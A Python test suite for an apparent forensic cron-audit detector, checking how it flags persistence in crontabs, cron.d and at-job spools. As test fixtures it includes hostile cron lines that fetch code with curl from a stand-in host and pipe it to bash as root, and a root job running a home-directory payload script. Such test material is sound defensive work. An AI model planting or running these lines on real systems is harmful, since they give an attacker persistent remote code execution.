"""Linux cron deep-audit detector tests."""

from __future__ import annotations

from digger.core.evidence import Artifact, EvidenceStore
from digger.detectors.cron_audit import (
    CronAuditDetector,
    _first_command_token,
    _is_system_path,
    _looks_writable,
    _schedule_seconds_estimate,
)


# ---- helpers ---- #


def _seed_crontab(store, path, contents):
    """Seed an /etc/crontab-style artifact (single text body)."""
    store.add_artifact(Artifact(
        collector="linux.cron",
        category="persistence",
        subject=f"cron:{path}",
        data={"path": path, "contents": contents,
              "mitre": "T1053.003"},
    ))


def _seed_crondir(store, dir_path, *entries):
    """Seed a cron-dir artifact with one or more entries."""
    es = [{"name": name, "size": len(c),
           "mtime": 1.0, "mode": "0o644", "contents": c}
           for name, c in entries]
    store.add_artifact(Artifact(
        collector="linux.cron",
        category="persistence",
        subject=f"cron-dir:{dir_path}",
        data={"path": dir_path, "entries": es,
              "mitre": "T1053.003"},
    ))


# ---- _looks_writable ---- #


def test_looks_writable_tmp():
    assert _looks_writable("/tmp/x") is True


def test_looks_writable_home():
    assert _looks_writable("/home/u/.cache/y") is True
    assert _looks_writable("/root/payload") is True


def test_looks_writable_relative():
    assert _looks_writable("./local") is True
    assert _looks_writable("~/x") is True


def test_looks_writable_safe():
    assert _looks_writable("/usr/local/bin/x") is False
    assert _looks_writable("") is False


# ---- _is_system_path ---- #


def test_is_system_path_canonical():
    assert _is_system_path("/usr/sbin/cron") is True
    assert _is_system_path("/opt/foo/bin/x") is True
    assert _is_system_path("/bin/echo") is True


def test_is_system_path_writable():
    assert _is_system_path("/home/u/x") is False
    assert _is_system_path("/tmp/x") is False


# ---- _first_command_token ---- #


def test_first_command_token_simple():
    assert _first_command_token("/usr/bin/echo hi") == "/usr/bin/echo"


def test_first_command_token_skips_env_prefix():
    assert _first_command_token("HOME=/x /usr/bin/myapp") == \
        "/usr/bin/myapp"


def test_first_command_token_empty():
    assert _first_command_token("") == ""


# ---- _schedule_seconds_estimate ---- #


def test_schedule_every_minute():
    assert _schedule_seconds_estimate("*", "*") == 60


def test_schedule_every_5_minutes():
    assert _schedule_seconds_estimate("*/5", "*") == 300


def test_schedule_every_hour():
    assert _schedule_seconds_estimate("0", "*") == 3600


def test_schedule_every_2_hours():
    assert _schedule_seconds_estimate("0", "*/2") == 7200


def test_schedule_one_off():
    """A single timestamp like ``30 4 * * *`` (daily) we don't
    characterize."""
    assert _schedule_seconds_estimate("30", "4") is None


# ---- C1 network fetch ---- #


def test_c1_curl_in_crontab_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "0 * * * * root curl -o /tmp/x https://e.com/x\n")
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_c1_pipe_to_shell_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(store, "/etc/cron.d",
                       ("evil", "0 * * * * root curl e.com/x | bash\n"))
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_network_fetch"]
        assert len(f) == 1
        assert f[0].severity == "critical"
        assert f[0].evidence["pipe_to_shell"] is True
    finally:
        store.close()


def test_c1_no_finding_for_clean_crontab(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "0 4 * * * root /usr/sbin/logrotate\n")
        findings = list(CronAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "cron_network_fetch"]
    finally:
        store.close()


# ---- C2 encoded payload ---- #


def test_c2_base64_payload_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(store, "/etc/cron.d",
                       ("blob",
                        "0 * * * * root echo " + ("A" * 200) + "\n"))
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_encoded_payload"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


# ---- C3 writable command ---- #


def test_c3_writable_command_high(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(store, "/var/spool/cron/crontabs",
                       ("alice", "0 * * * * /home/alice/x.sh\n"))
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_writable_command"]
        assert len(f) == 1
        assert f[0].severity == "high"
    finally:
        store.close()


def test_c3_no_finding_for_system_command(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(store, "/var/spool/cron/crontabs",
                       ("alice", "0 * * * * /usr/bin/logrotate\n"))
        findings = list(CronAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "cron_writable_command"]
    finally:
        store.close()


# ---- C4 root + attacker path ---- #


def test_c4_root_writable_command_critical(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "0 * * * * root /home/u/payload.sh\n")
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_root_attacker_path"]
        assert len(f) == 1
        assert f[0].severity == "critical"
    finally:
        store.close()


def test_c4_no_finding_for_root_system_command(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "0 * * * * root /usr/sbin/cron-job\n")
        findings = list(CronAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "cron_root_attacker_path"]
    finally:
        store.close()


def test_c4_no_finding_for_non_root_user(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "0 * * * * alice /home/alice/x.sh\n")
        findings = list(CronAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "cron_root_attacker_path"]
    finally:
        store.close()


# ---- C5 @reboot ---- #


def test_c5_reboot_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(store, "/var/spool/cron/crontabs",
                       ("alice", "@reboot /usr/bin/myapp --daemon\n"))
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_at_reboot"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


def test_c5_no_finding_without_reboot(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "0 4 * * * root /usr/sbin/logrotate\n")
        findings = list(CronAuditDetector().detect(store))
        assert not [x for x in findings
                    if x.evidence.get("kind") == "cron_at_reboot"]
    finally:
        store.close()


# ---- C6 at-job ---- #


def test_c6_at_job_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(store, "/var/spool/at",
                       ("a000001234567",
                        "#!/bin/sh\n# at-job from alice\n"
                        "/usr/local/bin/work.sh\n"))
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_at_job"]
        assert len(f) == 1
        assert f[0].severity == "medium"
    finally:
        store.close()


# ---- C7 high-frequency ---- #


def test_c7_every_minute_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "* * * * * root /usr/local/bin/beacon\n")
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_high_frequency"]
        assert len(f) == 1
        assert f[0].severity == "medium"
        assert f[0].evidence["estimated_period_s"] == 60
    finally:
        store.close()


def test_c7_every_3_minutes_medium(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(store, "/etc/cron.d",
                       ("fast", "*/3 * * * * root /opt/x\n"))
        findings = list(CronAuditDetector().detect(store))
        f = [x for x in findings
             if x.evidence.get("kind") == "cron_high_frequency"]
        assert len(f) == 1
        assert f[0].evidence["estimated_period_s"] == 180
    finally:
        store.close()


def test_c7_no_finding_for_hourly(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "0 * * * * root /usr/sbin/x\n")
        findings = list(CronAuditDetector().detect(store))
        # 3600s > 300s threshold
        assert not [x for x in findings
                    if x.evidence.get("kind") == "cron_high_frequency"]
    finally:
        store.close()


def test_c7_skips_env_lines(tmp_path):
    """Lines like ``SHELL=/bin/bash`` look like 5-field lines if we
    weren't careful; verify they're skipped."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crontab(store, "/etc/crontab",
                       "SHELL=/bin/bash\n"
                       "MAILTO=root\n"
                       "0 4 * * * root /usr/sbin/logrotate\n")
        findings = list(CronAuditDetector().detect(store))
        assert findings == []   # all rules satisfied: clean crontab
    finally:
        store.close()


# ---- stacking ---- #


def test_stacking_multiple_findings_one_line(tmp_path):
    """A single entry can trip multiple layers."""
    store = EvidenceStore(tmp_path / "case")
    try:
        _seed_crondir(
            store, "/etc/cron.d",
            ("evil",
             "* * * * * root curl https://e.com/x | bash\n"),
        )
        findings = list(CronAuditDetector().detect(store))
        kinds = {f.evidence.get("kind") for f in findings}
        # C1 network/pipe + C7 high-frequency (every minute) +
        # C4 root + non-system command (curl is /usr/bin/curl so
        # is system; in our test the first command token is "curl"
        # without a path — _is_system_path returns False).
        assert "cron_network_fetch" in kinds
        assert "cron_high_frequency" in kinds
        assert "cron_root_attacker_path" in kinds
    finally:
        store.close()


# ---- scope checks ---- #


def test_detector_returns_no_findings_on_empty_store(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        assert list(CronAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_ignores_other_collectors(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(Artifact(
            collector="other.collector",
            category="persistence",
            subject="x",
            data={"contents": "curl x | sh"},
        ))
        assert list(CronAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_handles_empty_contents_artifact(tmp_path):
    store = EvidenceStore(tmp_path / "case")
    try:
        store.add_artifact(Artifact(
            collector="linux.cron",
            category="persistence",
            subject="cron-dir:/etc/cron.d",
            data={"path": "/etc/cron.d",
                   "entries": [{"name": "empty", "size": 0,
                                 "mtime": 1.0, "mode": "0",
                                 "contents": ""}]},
        ))
        assert list(CronAuditDetector().detect(store)) == []
    finally:
        store.close()


def test_detector_registered_in_all_detectors():
    from digger.detectors import all_detectors
    names = {d.name for d in all_detectors()}
    assert "cron_audit" in names


def test_detector_sigma_template_has_persistence_tags():
    det = CronAuditDetector()
    tpl = det.to_sigma_template()
    assert tpl["id"] == "digger-cron-audit-template"
    assert "attack.t1053.003" in tpl["tags"]
    assert tpl["logsource"]["product"] == "linux"
